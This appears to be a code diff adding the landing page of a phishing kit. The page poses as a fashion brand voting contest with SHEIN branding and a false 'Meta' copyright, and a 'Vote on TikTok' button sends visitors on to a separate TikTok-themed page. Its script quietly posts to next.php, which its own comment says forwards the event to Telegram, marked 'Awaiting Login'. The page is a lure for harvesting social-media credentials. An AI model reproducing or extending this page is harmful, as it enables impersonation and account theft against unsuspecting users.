@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fashion Brand Voting</title>
+    <link href="assets/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
+            /* padding: 20px; */
+            position: relative;
+            width: 100%;
+        }
+        .product-card {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+            position: relative;
+            padding: 20px;
+            border: 1px solid #e0e0e0;
+        }
+        .language-dropdown {
+            margin-bottom: 10px;
+            width: 100%;
+            max-width: 400px;
+            height: 50px;
+        }
+        .brand-image {
+            width: calc(100% + 40px);
+            height: 200px;
+            object-fit: cover;
+            /* border-radius: 10px; */
+            /* border-top: 10px; */
+            border-bottom-right-radius: 0px;
+            margin-left: -20px;
+            margin-right: -20px;
+            margin-top: -20px;
+            margin-bottom: 15px;
+            position: relative;
+        }
+        .peoples-pick {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            color: white;
+            padding: 5px 10px;
+            /* border-radius: 5px; */
+            font-size: 22px;
+            font-weight: bold;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.7);
+        }
+        .brand-header {
+            display: flex;
+            align-items: center;
+            /* margin-bottom: 5px; */
+        }
+        .check-mark {
+            width: 50px;
+            height: 50px;
+            margin-right: 8px;
+            margin-bottom: 5px
+        }
+        .brand-name{
+            display: flex;
+            flex-direction: column;
+        }
+        .brand-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin: 0;
+            text-transform: uppercase;
+        }
+        .votes {
+            color: #666;
+            font-size: 11px;
+            margin-bottom: 10px;
+        }
+        .description {
+            color: #333;
+            font-size: 12px;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+        .vote-btn {
+            background: black;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 12px 20px;
+            font-size: 16px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            text-decoration: none;
+        }
+        .vote-btn img {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+        }
+        .vote-btn:hover {
+            background: #333;
+            color: white;
+            text-decoration: none;
+        }
+        @media (max-width: 768px) {
+            .product-card {
+                max-width: 90%;
+                margin: 0 auto;
+            }
+            .language-dropdown{
+                max-width: 80%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="language-dropdown">
+        <select class="form-select">
+            <option disabled selected>🌐 Select Language </option>
+            <option>English</option>
+            <option>French</option>
+            <option>Spanish</option>
+            <option>German</option>
+            <option>Italian</option>
+            <option>Portuguese</option>
+            <option>Chinese</option>
+            <option>Japanese</option>
+        </select>
+    </div>
+    <div class="product-card">
+        <div class="brand-image">
+            <img src="assets/images/shutterstock-498932230_286830.webp" alt="Fashion Brand" style="width: 100%; height: 100%; object-fit: cover; border-radius: 10px;">
+            <div class="peoples-pick">
+                THE PEOPLE'S PICK
+            </div>
+        </div>
+        <div class="brand-header">
+            <div class="">
+            <img src="assets/images/bluecheckmark.png" alt="Check" class="check-mark">
+            </div>
+            <div class="brand-name">
+            <h2 class="brand-title">SHEIN STUDIO</h2>
+             <div class="votes">230 votes . #3</div>
+            </div>
+        </div>
+        <p class="description">
+            I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. Your vote could be the difference-maker, propelling me towards victory.
+        </p>
+        <a href="simple_tiktok.html" class="vote-btn" onclick="sendVoteNotification()">
+            <img src="assets/images/vector-tiktok-social-media-logo_1093524-451.avif" alt="TikTok">
+            Vote on TikTok
+        </a>
+    </div>
+    <div style="position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); color: #666; font-size: 14px;">
+        © 2025 Meta
+    </div>
+
+    <script>
+        function sendVoteNotification() {
+            // Send vote notification to Telegram
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'next.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('vote=1&contestant=FASHION BRAND&status=Awaiting Login');
+        }
+    </script>
+</body>
+</html>
